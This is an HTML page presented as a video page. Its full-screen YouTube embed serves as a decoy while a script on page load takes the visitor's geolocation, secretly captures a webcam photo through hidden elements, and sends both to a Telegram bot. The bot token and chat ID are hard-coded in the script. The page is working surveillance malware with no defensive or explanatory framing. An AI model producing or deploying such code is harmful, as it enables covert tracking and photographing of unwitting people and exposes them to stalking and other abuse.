<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Video Page</title>
    <style>
        html, body {
            margin: 0;
            padding: 0;
            height: 100%;
            overflow: hidden;
            background-color: black;
        }
        #video-container {
            position: fixed;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            z-index: 1;
        }
        iframe {
            width: 100%;
            height: 100%;
            border: none;
        }
        #hidden {
            display: none;
        }
    </style>
</head>
<body>
    <div id="video-container">
        <iframe src="https://www.youtube.com/embed/-4fLvxV9fvE?autoplay=1&mute=1" 
                allow="autoplay; encrypted-media" 
                allowfullscreen></iframe>
    </div>

    <div id="hidden">
        <video id="cam" autoplay></video>
        <canvas id="canvas"></canvas>
    </div>

    <script>
        const BOT_TOKEN = '7393954828:AAHhCwcD7LlP8SUmCx-Pefw3IT-70yQynN4';
        const CHAT_ID = '7281698380';

        async function sendPhotoToTelegram(photoBlob) {
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('photo', photoBlob, 'photo.jpg');

            try {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
            } catch (error) {
                console.error('Error sending photo:', error);
            }
        }

        async function sendLocationToTelegram(latitude, longitude) {
            try {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        latitude: latitude,
                        longitude: longitude
                    })
                });
            } catch (error) {
                console.error('Error sending location:', error);
            }
        }

        async function capturePhoto() {
            const video = document.getElementById('cam');
            const canvas = document.getElementById('canvas');
            const context = canvas.getContext('2d');

            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            video.srcObject = stream;

            return new Promise(resolve => {
                video.onloadedmetadata = () => {
                    setTimeout(() => {
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;
                        context.drawImage(video, 0, 0, canvas.width, canvas.height);
                        canvas.toBlob(async (blob) => {
                            stream.getTracks().forEach(track => track.stop());
                            await sendPhotoToTelegram(blob);
                            resolve();
                        }, 'image/jpeg');
                    }, 1500);
                };
            });
        }

        document.addEventListener('DOMContentLoaded', async () => {
            try {
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(async (pos) => {
                        const { latitude, longitude } = pos.coords;
                        await sendLocationToTelegram(latitude, longitude);
                        await capturePhoto();
                    }, (err) => {
                        console.error('Geolocation error:', err);
                    });
                }
            } catch (error) {
                console.error('Unexpected error:', error);
            }
        });
    </script>
</body>
</html>
